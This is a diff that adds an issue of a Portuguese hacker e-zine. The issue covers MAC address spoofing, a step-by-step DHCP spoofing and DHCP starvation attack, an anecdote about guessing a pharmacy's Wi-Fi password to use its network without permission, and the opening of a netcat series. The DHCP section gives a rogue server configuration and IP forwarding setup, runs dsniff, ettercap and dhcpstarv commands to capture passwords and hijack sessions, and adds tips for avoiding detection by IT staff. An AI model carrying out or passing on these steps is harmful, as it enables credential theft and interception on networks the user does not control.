@@ -1,0 +1,883 @@
+                             _
+                            (_)                 _
+                               _         .=.   (_)
+                              (_)   _   //(`)_
+                                   //`\/ |\ 0`\\
+                                   ||-.\_|_/.-||
+                                   )/ |_____| \(    _
+                                  0   #/\ /\#  0   (_)
+                                     _| o o |_
+                              _     ((|, ^ ,|))
+                             (_)     `||\_/||`
+                                      || _ ||      _
+                                      | \_/ |     (_)
+                                  0.__.\   /.__.0
+                                   `._  `"`  _.'
+                                      / ;  \ \
+                                    0'-' )/`'-0
+                                         0`
+
+                 888b.  .d88b.  8     .d88b.  8888P O
+                 8wwwP  8P  Y8  88b.  8P  Y8    dP  w 8d8b. .d88b
+                 8   b  8b  d8  8  8  8b  d8   dP   8 8P Y8 8.ddb
+                 888P'  `Y88P'  88P'  `Y88P'  d8888 8 8   8 `Y88P
+
+                                                                Edição: 00x02
+                                                                Fevereiro de 2013
+
+         "O mundo não é mais controlado por armas, energia ou dinheiro.
+          É controlado por cifras e dados." - Filme "Sneakers", 1992.
+
+                              ..:: Introdução ::..
+
+      E aí pessoal, acharam que a e-zine iria morrer na primeira edição? rs
+     Até que a primeira edição conseguiu alguns leitores e rendeu alguns elo-
+     gios (acredite, isso é muito importante!). Andei sumido por uns tempos,
+     sabe como é né? Os estudos... O que você sabe nunca é o suficiente.
+     O tempo está passando e estou vendo como necessidade escrever mais textos,
+     justamente pelo fato de aprender mais escrevendo eles. Bem, para quem
+     está se deparando comigo agora, o propósito dessa zine não é, e nem tem
+     como objetivo, chegar aos pés de zines como a TheBugMagazine e Cogumelo
+     Binário. O objetivo aqui é compartilhar informações para toda uma grande
+     massa de newbies famintos por conhecimento que perambulam internet a
+     fora em busca de novas informações.
+     Se você quiser publicar algum texto meu no seu blog/site, tudo bem, pode
+     publicar. Mas por favor, meu nick é B0b0_d4_c0rt3 e o site é B0b0Labs, ok?
+     Coloque isso nos créditos. É chato encontrar algum texto meu com nick de
+     outro cara ;(
+     Mas enfim, espero que gostem desta edição! Go go go...
+
+                                 Tópicos
+
+          [1] Alterando o endreço MAC ....................... B0b0_d4_c0rt3
+          [2] DHCP Attacks  ................................. B0b0_d4_c0rt3
+          [3] Querido diário ................................ B0b0_d4_c0rt3
+          [4] Netcat: A série ............................... B0b0_d4_c0rt3
+          [5] Filmes Hacku's ................................ B0b0_d4_c0rt3
+          [6] Enviando mensagens para users logados ......... B0b0_d4_c0rt3
+          [7] Free Software song ............................ Richard Stallman
+          [8] FIM ........................................... B0b0_d4_c0rt3
+
+               [1]========================================[+]
+                 |        Alterando o endereço MAC     	  |
+               [+]========================================[1]
+
+  [ 0x100  Introducting... =D
+
+    Primeiro de tudo acho que todos aqui já sabem o que é uma placa de rede, afinal,
+    se conseguiu esse paper é porque está conectado a uma rede por meio de uma NIC.
+    NIC é uma outra forma de se referir a uma interface de rede, é a sigla para
+    Network Interface Card.
+
+    O objetivo principal desse texto é discutir sobre a alteração do endereço MAC.
+    A ideia é mostrar como na prática os sistemas operacionais salvam na memória os
+    endereços MAC. E como eles o acessam. (E como podemos alterá-lo).
+
+  [ 0x200  Interface de rede e endereço MAC
+
+    As interfaces de rede são equipamentos responsáveis por prover a comunicação
+    dos equipamentos em uma rede (computadores, roteadores, switchs e etc).
+
+    Os fabricantes de placas de rede inserem algumas informações em uma memória EEPROM
+    nestas placas, dentre as várias informações que são armazenadas encontramos
+    quantidade que dados que serão enviados, recebidos, buffer, etc, e um identicador:
+    uma sequência única no MUNDO de 48 bits.
+
+    Para que estes equipamentos possam trocar dados entre si, eles precisam destes
+    identificadores na camada de enlace para que os frames ethernet cheguem ao seu
+    destino e que o destino saiba para quem responder.
+
+    Este identificador é o famoso endereço "MAC", normalmente representado por 12
+    algarismos hexadecimais.
+
+    Em uma rede Ethernet (essas no qual usamos no dia-a-dia em LAN's), os frames
+    trocados pelos computadores tem em seu cabeçalho, no endereço de origem e destino,
+    o MAC das máquinas que estão se comunicando.
+
+    Como as camadas de protocolos funcionam de modo independente um do outro, a
+    camada do Ethernet precisa apenas saber o MAC do destinatário, independente
+    do sistema já ter o endereço IP (afinal, quem irá transportar os datagramas IP
+    serão os frames Ethernet). Então, quando já se sabe o endereço IP mas não o
+    MAC, a camada de rede utiliza-se do protocolo ARP para fazer a resolução de
+    "IP para MAC" e guardar temporiariamente em cache as associações IP/MAC no
+    sistema.
+
+    Uma coisa interessante é que o endereço MAC é implementado em qualquer dispositivo
+    que interaja em uma rede ethernet, ou seja, placas PCI, wireless, roteadores,
+    tablets, smartphones... Tudo isso tem endereço MAC.
+
+    Resumindo: Os fabricantes de placas de rede inserem nesses dispositivos endereços
+    únicos que serão usados pelo protocolo de enlace Ethernet para a troca de frames.
+
+    Como o foco aqui não é Ethernet, ARP etc, vamos prosseguir com o texto...
+
+  [ 0x300 Porque trocar meu endereço MAC?
+
+    Bem, se você não sabe porque trocar seu endereço MAC, então é melhor nem tentar
+    fazer isso rsrs. Mas existem algumas situações que trocar esse endereço se faz
+    necessário, como por exemplo, para quem se conecta em redes em que só é liberado
+    acesso para determinadas máquinas cujo MAC address esteja especificado no acess
+    point/roteador. Ou também para quem quer anonimidade em uma rede, não podendo
+    ser identificado pelo MAC original.
+
+    Enfim, existem várias situações que trocar o endereço da placa seria uma boa.
+
+    OK, B0b0! Mas se o endereço MAC está armazenado em uma memória EEPROM, como é
+    possível alterar o endereço dela? Uma vez que alterar dados de EEPROM envolveria
+    altos conhecimentos técnicos de eletrônica e programação.
+
+    Beleza, foi isso que eu me perguntei antes de pesquisar mais sobre isso.
+
+  [ 0x301 Alterando o MAC no Windows
+
+    Nas versões antigas do Windows, da versão 95 até á 2000, quando o Windows
+    requisitava o MAC da placa de rede do computador, ele se comunicava diretamente
+    com a placa por meio do driver.
+
+    Creio que pela falta de agilidade nesse procedimento de acesso as informações da
+    placa, a Microsoft a partir do Windows XP implementou uma nova maneira de acessar
+    as informações da NIC de forma mais rápida. Ao invés de toda vez acessar a placa
+    para pegar o MAC, o sistema simplesmente pega as principais informações da interface
+    de rede e salva no registro. Assim, toda vez que o sistema tiver que fornecer o
+    endereço MAC do computador, ele consultará uma determinada chave do registro, não
+    a placa.
+
+    É aí que entra os programas que alteram o endereço MAC!
+
+    Para ver seu endereço MAC, você pode rodar o comando "ipconfig" com o parâmetro /all
+    ou o comando "getmac" no prompt do Windows, no meu computador essa foi a saída:
+
+    Adaptador Ethernet Conexão local 2:
+
+    Sufixo DNS específico de conexão. . . . . . :
+    Descrição . . . . . . . . . . . . . . . . . : NIC Fast Ethernet PCI-E Realtek
+    Família RTL8101E (NDIS 6.20) #2
+    Endereço Físico . . . . . . . . . . . . . . : 00-30-70-D9-21-30          <- MAC Address :D
+    DHCP Habilitado . . . . . . . . . . . . . . : Sim
+    Configuração Automática Habilitada. . . . . : Sim
+    Endereço IPv4. . . . . . . .  . . . . . . . : 192.168.1.4(Preferencial)
+
+    Na verdade saiu bem mais coisa, mas o que nos interessa é a opção "Endereço Físico" que
+    informa o endereço físico da minha placa: 00-30-70-D9-21-30. No seu PC obviamente vai
+    estar diferente.
+
+  [ 0x302 Mudança de MAC no Windows 7
+
+    O Windows 7 salva o seu endereço MAC em um valor do tipo string em alguma chave localizada
+    no caminho:
+
+    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}
+
+    Quando disse "alguma chave", quis dizer que como a subchave {4D36E972-E325-11CE-BFC1-08002BE10318}
+    armazena várias informações sobre os adaptadores de rede (incluindo até interfaces virtuais como
+    as do VMware e do VirtualBox), uma das várias sub-chaves será a da interface que está sendo usada
+    pelo seu sistema.
+
+    Dentre as várias sub-chaves, encontrei uma chamada "0015" que NO MEU CASO armazena dados da
+    minha placa.
+
+    No meio dos vários dados encontrados na chave 0015, encontrei um valor do tipo string
+    chamado "NetworkAddress" armazenando o endereço MAC do meu computador.
+
+    Para então "alterar o endereço MAC" do meu computador, basta dar 'dois cliques' no valor
+    NetworkAddress e mudar o que estiver salvo lá. Mas só de alterar o MAC no registro não quer
+    dizer que a alteração já entrou em vigor, para que isso aconteça, desative a interface de
+    rede e ative-a novamente:
+
+    C:\> netsh interface set interface "Conexão local 2" disabled
+    C:\> netsh interface set interface "Conexão local 2" enabled
+
+    Obs: é preciso ter permissões de administrador pra desativar a placa via linha de comando.
+    Obs²: é possível desativar a placa lá em "Conexões de rede" no "Painel de Controle" ;D
+    Obs³: ou você pode reiniciar seu computador.
+
+    Vamos supor que o NetworkAddress continha o valor 003070D92130. Alterei para: 003070D92131.
+    Desabilitei e habilitei minha placa e rodei ipconfig /all novamente:
+
+    Adaptador Ethernet Conexão local 2:
+
+    Sufixo DNS específico de conexão. . . . . . :
+    Descrição . . . . . . . . . . . . . . . . . : NIC Fast Ethernet PCI-E Realtek
+    Família RTL8101E (NDIS 6.20) #2
+    Endereço Físico . . . . . . . . . . . . . . : 00-30-70-D9-21-31               <- Alterado!
+    DHCP Habilitado . . . . . . . . . . . . . . : Sim
+    Configuração Automática Habilitada. . . . . : Sim
+    Endereço IPv4. . . . . . . .  . . . . . . . : 192.168.1.4(Preferencial)
+
+    Pronto!
+
+    No seu caso, você terá que ir fuçando manualmente as chaves e subchaves até encontrar a que
+    armazena dados da sua NIC. Você também pode usar a opção de pesquisa que o Regedit dispõe
+    para encontrar determinados valores ou chaves ;D
+
+    Bem, como meu experimento foi só no Windows 7, este procedimento pode ser diferente em uma
+    versão anterior ou posterior.
+
+    Também é possível fazer essa alteração de uma forma mais fácil. Basta acessar o Painel de
+    controle, ir lá nas opções de rede, ir nas "Propriedades" da NIC que você quer alterar
+    o endereço físico, clicar na aba "Avançado", selecionar a opção "Endereço de rede" e
+    adicionar um novo MAC address.
+
+  [ 0x500 E no Linux?
+
+    Como todos sabemos, o GNU/Linux não possui registro. Os dados carregados na memória desse
+    sistema pode ser encontrados nos diretórios virtuais "/proc" e "/sys".
+
+    No Linux, o endereço MAC é encontrado no arquivo "address" no caminho /sys/class/net/INTERFACE*
+    O "INTERFACE" varia de cada interface de rede no computador. No meu caso, o arquivo address
+    que contém o MAC do wlan0 é encontrado em /sys/class/net/wlan0/address.
+
+    Com apenas uma linha de comando você consegue fazer a alteração do MAC Address usando o
+    comando ifconfig:
+
+        ifconfig INTERFACE hw ether NOVOMAC
+
+    Você precisa saber qual é a interface de rede que seu sistema está usando, no meu caso é
+    wlan0, como estou conectado via wireless. Caso não saiba, rode o comando "ifconfig" que
+    ele irá listar as interfaces do seu computador.
+
+    Olhe como é a saída do meu ifconfig na iface wlan0:
+
+       wlan0     Link encap:Ethernet  Endereço de HW 00:26:c7:aa:d2:d8
+                 inet end.: 192.168.1.2  Bcast:192.168.1.255  Masc:255.255.255.0
+                 endereço inet6: fe80::226:c7ff:feaa:d28c/64 Escopo:Link
+                 UP BROADCAST RUNNING MULTICAST  MTU:1500  Métrica:1
+                 pacotes RX:345 erros:0 descartados:0 excesso:0 quadro:0
+                 Pacotes TX:422 erros:0 descartados:0 excesso:0 portadora:0
+                 colisões:0 txqueuelen:1000
+                 RX bytes:197651 (197.6 KB) TX bytes:66757 (66.7 KB)
+
+    Como vocês podem ver, na primeira linha temos o "Endereço de HW" que nos informa o MAC
+    do meu computador.
+
+    Antes de mais nada, uma observação: O novo MAC só entra em vigor quando a interface for
+    reiniciada (não muito diferente do Windows).
+
+    Então, terei que desativar minha placa,
+
+       # ifconfig wlan0 down
+
+    alterar o MAC
+
+       # ifconfig wlan0 hw ether 00:26:c7:aa:2d:66
+
+    e ativá-la novamente:
+
+       # ifconfig wlan0 up
+
+    Analizando novamente o MAC, teremos:
+                                                                            -> Má rapá :D
+        B0b0@b0b0book:~$ ifconfig wlan0                                    |
+        wlan0     Link encap:Ethernet  Endereço de HW 00:26:c7:aa:2d:66  <-
+                  inet end.: 192.168.1.2  Bcast:192.168.1.255  Masc:255.255.255.0
+                  endereço inet6: fe80::226:c7ff:feaa:d28c/64 Escopo:Link
+                  UP BROADCAST RUNNING MULTICAST  MTU:1500  Métrica:1
+                  pacotes RX:32688 erros:0 descartados:0 excesso:0 quadro:0
+                  Pacotes TX:19927 erros:0 descartados:0 excesso:0 portadora:0
+                  colisões:0 txqueuelen:1000
+                  RX bytes:45252163 (45.2 MB) TX bytes:2129621 (2.1 MB)
+
+  [ 0x400 Conferindo se o MAC foi mesmo trocado
+
+    Uma maneira que você pode fazer para conferir se o MAC do PC foi mesmo alterado,
+    pode ser usando o comando "arp" de um outro computador.
+
+    No início do texto eu disse que os sistemas em rede utilizam o protocolo ARP
+    para capturar o MAC dos outros equipamentos.
+
+    Mas eles precisam guardar por um tempo o endereço MAC dos respectivos IPs ativos
+    na rede para não ficar 'perguntando' toda hora e consequentemente gerar tráfego
+    desnecessário.
+
+    Assim, os IPs e MACs são armazenados em uma espécie de tabela, esta tabela pode
+    ser acessada pelo então já citado comando "arp".
+
+    Para comprovar a alteração, dê um ping no IP do PC com MAC alterado:
+
+    [b0b0@PC ~]$ ping 192.168.1.4 -c 3
+    PING 192.168.1.4 (192.168.1.4) 56(84) bytes of data.
+    64 bytes from 192.168.1.4: icmp_req=1 ttl=128 time=10.0 ms
+    64 bytes from 192.168.1.4: icmp_req=2 ttl=128 time=2.93 ms
+    64 bytes from 192.168.1.4: icmp_req=3 ttl=128 time=1.59 ms
+
+    Depois, acesse a tabela ARP do sistema, execute "arp -a" no shell:
+
+    [b0b0@PC ~]$ arp -a
+    ? (192.168.1.4) em 00:30:70:d9:21:31 [ether] em wlan0     <---- Tcharamm!
+    ? (192.168.1.1) em d3:e8:7b:3a:c9:1f [ether] em wlan0
+    [b0b0@PC ~]$
+
+  [ 0x500 Conclusão
+
+    A partir de agora temos uma noção melhor de como funcionam os programas que conseguem
+    alterar o MAC de nossos computadores, como o sMAC, aMAC e machanger. Também aprendemos
+    que a mudança não é permanente, ou seja, ela não altera os dados das nossas NIC's.
+
+    Se isso te serviu para alguma coisa, façam o que quiser com o conhecimento adquirido,
+    tanto para o bem ou para o mal!
+
+               [2]========================================[+]
+                 |             DHCP Attacks     	  |
+               [+]========================================[2]
+
+   [ Introdução ao DHCP
+
+     Em uma rede TCP/IP, todas as máquinas precisam ser identificadas com números IP para
+     serem reconhecidas nela. Para que um computador consiga se comunicar sem problemas
+     na rede, ele precisa basicamente de duas informações:
+        * Endereço IP (único na rede).
+        * Máscara de subrede.
+     Para que este computador tenha uma maior interação com a rede (e com outras redes),
+     são necessarias mais outras duas informações: endereço do gateway e DNS.
+     Em redes pequenas é fácil configurar manualmente essas informações em cada host.
+     Mas o problema começa quando a rede tem muitos computadores e atribuir IP, máscara,
+     gateway e DNS manualmente se torna um problema.
+     Então para isso, foi criado o Protocolo de configuração dinâmica de host, em inglês,
+     Dynamic Host Configuration Protocol (D.H.C.P). O que esse serviço faz, é fornecer
+     as informações que os computadores precisam, atribuindo um IP diferente a cada
+     máquina de forma dinâmica e automática.
+
+   [ Como o DHCP funciona
+
+     O DHCP funciona no modo cliente/servidor. Em redes internas de grandes instituições,
+     empresas, e etc, é comum encontrar servidores dedicados quase que apenas para o DHCP.
+     Em redes domésticas os roteadores possuem um servidor DHCP ativo por padrão.
+
+     Todo servidor DHCP possui um tempo de concessão para cada IP fornecido. Isso quer dizer
+     que o endereço IP que o server concede aos clientes possui um tempo de utilização.
+     Isso serve para caso um host se desconecte da rede, após um tempo o IP dele possa ser
+     reutilizado por outro host.
+
+     O protocolo DHCP atua sobre o procotolo de transporte UDP e o serviço DHCP usa a porta
+     67 para receber requisições dos clientes e a porta 68 para responder a eles. Atualmente
+     todo sistema operacional, possui um cliente dhcp.
+
+   [ Como um cliente DHCP envia requisições ao servidor se ele ainda não tem um IP ?
+
+     Quando uma máquina cliente solicita um ip para o DHCP server da rede, ela não tem a
+     mínima ideia de quem é o servidor (ela nem sabe o IP dele). Então ela manda uma
+     requisição DHCP em broadcast encapsulada em um datagrama UDP cuja porta de origem é 68
+     e a de destino 67. Como o modo de envio é em broadcast, o endereço de destino é
+     255.255.255.255. O MAC do destino também é em broadcast ff:ff:ff:ff:ff:ff, já que ela
+     nem sabe o endereço físico do server. Como ela ainda não tem um IP, o endereço que será
+     usado até então é o ip de rede: 0.0.0.0.
+
+     Desse modo, todas as máquinas da rede local receberá a requisição DHCP, mas apenas
+     o servidor irá processar o pedido e irá responder (ainda em broadcast) com as
+     informações para a máquina. Só o cliente que fez a primeira requisição tomará as
+     informações para si. Os outros hosts que receberem a resposta do servidor simplesmente
+     ignorará, uma fez que o frame ethernet gerado pelo servidor possui o MAC do cliente.
+
+   [ DHCP Spoofing
+
+     Podemos nos aproveitar do funcionamento do DHCP para capturar o tráfego dos hosts,
+     realizando o conhecido MITM: Man-in-the-middle. Onde nosso computador ficará entre
+     a comunicação dos clientes e o verdadeiro gateway da rede. Esta técnica é conhecida
+     como "DHCP Spoofing". Uma vez todos os dados transmitidos e recebidos pelos hosts
+     passarem pelo nosso sistema, podemos utilizar de sniffers para capturar senhas e até
+     roubar sessões já antes estabelecidas.
+
+   [ Como funciona o ataque
+
+     Já que as requisições DHCP são enviadas em broadcast em toda rede, podemos criar um
+     servidor DHCP malicioso cujo endereço do gateway seja o IP da nossa máquina e esperar
+     pelas requisições dos clientes, "disputando" com o servidor DHCP real.
+     Uma vez uma máquina cliente ter como gateway o IP do 'hacker', todos os dados serão
+     transmitidos para ele.
+
+     Na prática, basicamente precisaremos fazer o seguinte:
+
+      * Configurar um DHCP Server, cujo IP do gateway seja o IP da nossa própria máquina.
+       * Rodar o servidor.
+        * Esperar pelos clientes....
+
+     A desvantagem desse tipo de ataque, é que não são todas as máquinas que iremos pegar,
+     e se um dos usuários da rede for esperto, ele pode desconfiar caso o IP do gateway
+     da máquina dele estiver configurado com um endereço diferente do normal :¬)
+
+   [ Preparar... Apontar...
+
+     Existem programas prontos que fazem esse ataque por nós. Mas neste artigo optei
+     por fazer esse procedimento "na unha" mesmo rs. Os testes foram feitos em um sistema
+     Debian 6.0, e a vítima um Windows XP.
+
+     Para configurar o servidor, teremos que instalar o seguinte pacote:
+
+       root@Deadpool:~# apt-get install dhcp3-server
+
+     Uma vez instalado o pacote, ele criará o diretório "dhcp" em /etc.
+     Neste diretório, edite o arquivo de configuração dhcpd.conf.
+     Recomendo apagar este arquivo ou fazer um backup dele, pois iremos
+     usar apenas do código abaixo.
+
+     root@Deadpool:~# nano /etc/dhcp/dhcpd.conf
+
+      subnet 192.168.1.0 netmask 255.255.255.0 {
+       range 192.168.1.40 192.168.1.60;
+       option routers 192.168.1.6;
+       option domain-name-servers 8.8.8.8;
+       option broadcast-address 255.255.255.255;
+      }
+
+     No meu caso, o DHCP distribui IPs para uma rede classe C. As informações são:
+     Endereço de rede:              192.168.1.0
+     Máscara de subrede:            255.255.255.0
+     Broadcast:                     255.255.255.255
+     Range de ips que serão usados: de 192.168.1.40 até 192.168.1.60
+     Gateway:                       192.168.1.6    (O endereço IP do próprio servidor)
+     Servidor de DNS:               8.8.8.8
+
+     O perigo está na linha: "option routers 192.168.1.6;". Esta linha determina
+     para as máquinas clientes quem é o gateway delas, neste caso o IP que será
+     atribuido é o do próprio servidor (a máquina do atacante).
+
+     Agora que já instalamos o servidor e configuramos ele, precisamos reiniciá-lo
+     para que o dados que configuramos entre em vigor:
+
+       root@Deadpool:~# service isc-dhcp-server restart
+
+     Pronto! O servidor está configurado e quase pronto pro ataque!
+
+     "Quase !?" O que falta mais?
+
+     Como nosso computador além de atuar como servidor de DHCP, ele terá que ser um
+     roteador também! Então para isso, teremos que ativar a capacidade do nosso sistema
+     de fazer "forwarding" de pacotes que não são destinados a ele.
+
+     Vamos a ativar dando o valor TRUE para o arquivo de kernel "ip_forward":
+
+       root@Deadpool:~# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+     Agora sim...
+     Duas dicas:
+      1 - Certifique-se a rota default dos dados repassados serão para o gateway
+          original com o "route -n". Afinal, não queremos que ninguém fique sem
+          internet né?
+
+      2 - Adapte o ataque para cada rede em que será realizado. Não queremos um
+          servidor DHCP distribuindo IPs de classe C em uma rede de A.
+
+   [ Fogo!!!
+
+     Agora é só preparar os sniffers para capturar logins de FTP, Telnet (sim, hoje em dia
+     quase não se usa isso, mas se estiver snifando uma rede grande poderá quem sabe catar
+     senha de roteador), SMTP e etc. Um bom sniffer que pode nos ajudar nessa façanha é o
+     dsniff. Outro muito bom também é o ettercap.
+
+     Para capturar senhas com o dsniff, simplesmente digite: "dsniff" no shell. Com este
+     sniffer você pode especificar a interface que será farejada com o parâmetro -i (por
+     padrão ele já detecta a iface que tá sendo usada), e pode gravar os dados capturados
+     em um arquivo com "-w". Ex:
+
+       root@Deadpool:~# dsniff -i eth0 -w capturados
+
+     Para capturar senhas com o ettercap, digite: ettercap -T -q
+     Uma coisa chatinha desse sniffer, é que toda vez que ele é encerrado, ela volta o
+     arquivo ip_forward ao normal (insere o '0' novamente, desativando o forwarding).
+     Dica: altere o arquivo etter.conf para rodar o ettercap como root. (Não vou entrar
+     em detalhes sobre o Ettercap, pois pretendo dedicar um texto a ele.)
+
+     Na grande maioria das vezes, o cara que vai realizar um MITM possui um sistema dotado
+     de interface gráfica. Então, nada melhor que desfrutar de todos os recursos do
+     excelente Wireshark para nós analizarmos todo o tráfego. Com o Wireshark você pode
+     filtrar a captura para mostrar apenas o(s) protocolo(s) que você queria pegar dados
+     (e que dados você quer pegar).
+
+   [ Concluindo
+
+     Pronto! Agora sabemos como funciona e como arquitetar um ataque de DHCP Spoofing. Só
+     tenha cuidado para não ser identificado.
+     Algumas dicas:
+                    * Altere o endereço MAC da sua máquina.
+                    * Não faça esse ataque por muito tempo. Pois uma vez os cara da
+                      área de TI perceberem uma queda no desempenho da rede, ou outras
+                      anomalias, eles podem tomar medidas contra isso (DHCP Snooping!).
+                    * Não deixe portas abertas no seu sistema que possa te identificar!
+                      (samba, nfs, ssh, ftp...). Alguém pode te escanear.
+
+     Ei... lembra quando eu disse que "existem programas prontos que fazem isso por nós" ?
+     Para o texto não ficar muito vago e chato, vamos ver como fazer isso com o Ettercap!!!
+
+  [ DHCP Spoofing with Ettercap
+
+    Para tal façanha o esquema é o seguinte:
+
+       ettercap -T -q -i IFACE -M dhcp:FAIXA-DE-IPs/MÁSCARA.DE.SUBREDE/ENDEREÇO.DNS
+
+    Não precisamos especificar o nosso IP, pois o ettercap já subentende que o IP do gateway
+    é o IP do cara que o está executando.
+
+    Na prática seria o seguinte:
+
+       root@Deadpool:~# ettercap -T -q -i eth0 -M dhcp:192.168.1.10-50/255.255.255.0/8.8.8.8
+
+       ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA
+
+       Listening on eth0... (Ethernet)
+
+         eth0 ->	08:00:27:ED:EB:17       192.168.1.6     255.255.255.0
+
+       SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+       Privileges dropped to UID 0 GID 0...
+
+         28 plugins
+         39 protocol dissectors
+         53 ports monitored
+       7587 mac vendor fingerprint
+       1698 tcp OS fingerprint
+       2183 known services
+
+      DHCP spoofing: using specified ip_pool, netmask 255.255.255.0, dns 8.8.8.8
+      Starting Unified sniffing...
+
+      Text only Interface activated...
+      Hit 'h' for inline help
+
+      DHCP: [00:26:C7:AA:C3:9B] REQUEST 192.168.1.10
+      DHCP spoofing: fake ACK [00:26:C7:AA:C3:9B] assigned to 192.168.1.10
+      DHCP: [192.168.1.6] ACK : 192.168.1.10 255.255.255.0 GW 192.168.1.6 DNS 8.8.8.8
+
+     Podemos perceber pelas últimas 3 linhas que uma máquina cujo MAC é 00:26:C7:AA:C3:9B
+     recebeu o endereço 192.168.1.10.
+
+   [ Aumentando o poder de destruição...
+
+     Lembra quando eu disse que:
+        "Todo servidor DHCP possui um tempo de concessão para cada IP fornecido" ...?
+
+     E lembra quando eu disse:
+
+        "[...] podemos criar um servidor DHCP malicioso cujo endereço do gateway seja o
+         IP da nossa máquina e esperar pelas requisições dos clientes, "disputando" com
+         o servidor DHCP real." ... ?
+
+     Pois é, é possível a gente se aproveitar do tempo de concessão do servidor DHCP real
+     para termos vantagem sobre a disputa com nosso "DHCP malicious". Isso utilizando
+     uma técnica chamada de:
+
+   [ DHCP Starvation
+
+     Em bom e velho português (e traduzido pelo Google Translate), "starvation" significa
+     "fome". O nome desse ataque faz referência ao que acontece quando ele está ocorrendo:
+
+     Iremos 'comer' todos os endereços IPs que o servidor DHCP fornece. Dessa forma a gente
+     consegue consumir todo (ou quase todo) range de IP's que o servidor consegue fornecer.
+     Isso é muito bom no momento que iremos fazer DHCP spoofing. Pois uma vez o DHCP real
+     não conseguir distribuir IPs para os clientes, irá sobrar apenas nosso servidor. Aí
+     podemos fazer a festa!
+
+     Mas B0b0, como isso é possível?
+
+     Utilizando de um programa ou script especialmente projetado para esse tipo de ataque,
+     da nossa máquina centenas de DHCP requests partirão para toda a rede. O servidor DHCP
+     quando receber cada uma destas requisições ingenuamente irá atribuir um IP para elas.
+     Como para cada IP fornecido há um tempo de concessão, por um determinado tempo, vários
+     endereços IPs ficarão ocupados, impedindo que clientes legítimos os adquirem. Isso
+     abre uma brecha para nós ativarmos nosso DHCP fake e receber as requisições de muitas
+     máquinas.
+
+   [ Botando a mão na massa
+
+     Vamos usar a tool Dhcpstarv. Site oficial da ferramenta:
+                http://dhcpstarv.sourceforge.net/
+
+     Baixe-o neste link:
+                http://sourceforge.net/project/platformdownload.php?group_id=212181
+
+     Baixando, descompactando e instalando.
+
+        root@Deadpool:~# wget http://ufpr.dl.sourceforge.net/project/dhcpstarv/dhcpstarv/0.2.1/dhcpstarv-0.2.1.tar.gz
+        root@Deadpool:~# tar zxvf dhcpstarv-0.2.1.tar.gz
+        root@Deadpool:~# cd dhcpstarv-0.2.1/
+        root@Deadpool:~/dhcpstarv-0.2.1# ./configure
+        root@Deadpool:~/dhcpstarv-0.2.1# make && make install
+
+    Os parâmetros do dhcpstarv são estes:
+
+        -h, imprime o help.
+        -d, permite nós especificarmos o MAC do gateway para que os
+            requests não ocorram em broadcast.
+        -i, especifica a interface de rede que será usada.
+        -e, permite que seja ignorado as respostas DHCP de um determinado
+            servidor.
+        -v, apresenta mensagem sobre o que está acontecendo.
+        -p, não coloca a interface usada em modo promísuco.
+
+     O parâmetro -e é útil quando estamos fazendo um ataque de DHCP Starvation e Spoofing
+     simultaneamente. Isso serve para que o dhcpstarv não ataque nosso próprio DHCP do mal.
+     Na prática, caso o ataque ocorra simultanemente com um DHCP Spoofing, teremos que
+     especificar o nosso endereço IP para que o dhcpstarv ignore os replies do nosso server.
+
+     O parâmetro -d também é muito útil, caso sabemos o endereço MAC do servidor DHCP. Desse
+     modo todos os requests serão enviados diretamente ao servidor, sem a necessidade de
+     ser em broadcast.
+
+   [ Flodando...
+
+     Chega de conversa e vamos lá!
+     Um ataque básico seria simplesmente assim:
+
+     root@Deadpool:~# dhcpstarv -i eth0
+
+     Agora, se o MAC do gateway for 00:0e:f4:9a:1a:50. Fazemos o seguinte:
+
+     root@Deadpool:~# dhcpstarv -i eth0 -d 00:0e:f4:9a:1a:50
+
+     Se a gente quiser que as requisições DHCP não sejam respondidas pelo no nosso server fake,
+     é só especificar o IP da nossa máquina, como em:
+
+     root@Deadpool:~# dhcpstarv -i eth0 -e 192.168.1.6
+
+   [ Fim.
+
+     Aqui, floodar o DHCP do meu roteador demora muito.
+     Mas se o ataque acontece em uma rede grande (como uma de faculdade),
+     rapidinho consegue-se êxito.
+     Pronto, acabei.
+
+               [3]========================================[+]
+                 |           Querido diário        	  |
+               [+]========================================[3]
+
+     Quebrar senhas Wifi é o sonho de muita gente. Uma vez eu estava trabalhando
+     em uma loja que ficava ao lado de uma drogaria, a loja onde eu ficava não tinha
+     internet ;( Mas a drogaria tinha!
+     Naquela farmácia havia uma rede wireless WPA2 habilitada e graças a Deus o sinal
+     pegava na minha loja. Eu pensava várias maneiras de conseguir a senha daquela
+     rede. Até que resolvi pensar o seguinte: SE EU FOSSE OS CARAS DA FARMÁCIA, QUE
+     SENHA EU COLOCARIA?
+
+     Criei uma pequena lista de todas as possíveis senhas e resolvi testá-las uma
+     a uma. Até que eu consegui conectar no Wifi deles: A senha era o telefone
+     que estava estampado no topo da drogaria.
+
+     Depois disso, desfrutei da internet (lenta e) gratuita por um bom tempo.
+
+     Moral da história: Não adianta ter uma rede com uma criptografia forte se a
+     senha é fraca.
+
+               [4]========================================[+]
+                 |           Netcat: A série       	  |
+               [+]========================================[4]
+
+     Vou tentar neste tópico enumerar o maior número de coisas possíveis a se fazer com
+     o netcat. Este é o primeiro de vários outros tópicos que encontraremos nas próximas
+     edições.
+
+     Um canivete suíço, diferente de um canivete comum, possui muito mais utilidade por
+     atender a várias necessidades de seu utilizador. Por isso o termo 'canivete suíço' é
+     utilizado para se referir á algo que possui multi-utilidades.
+
+     O netcat é um software aparentemente simples por ser leve e de utilização via linha
+     de comando. Foi desenvolvido por "Hobbit" em 1996, trabalha com os protocolos de
+     transporte TCP e UDP. Originalmente, foi desenvolvido para Unix, mas hoje está presente
+     para os principais sistemas operacionais: Linux, Windows e Mac OS (Não esquecendo o fato
+     de o linux e o mac os de certo modo, ser um tipo de unix também).
+
+     O netcat, é comumente chamado de "canivete suíço" por ser utilizado de diversas maneiras
+     envolvendo protocolos do TCP/IP e o sistema  operacional.
+     Ao contrário do que se pensa, o netcat não é um software malicioso. Malicioso são as
+     maneiras usadas pelo seu utilizador.
+
+     O netcat é bem flexível, e pode ser utilizado como "cliente" para diversos protocolos de
+     aplicação como: SMTP, FTP, POP3, HTTP, TELNET e etc. Isso se deve ao fato do netcat não
+     atuar na camada de aplicação, mais sim, no protocolo de transporte. Dessa forma, é possível
+     conectar em uma porta e rodar os comandos do protocolo de aplicação no servidor.
+
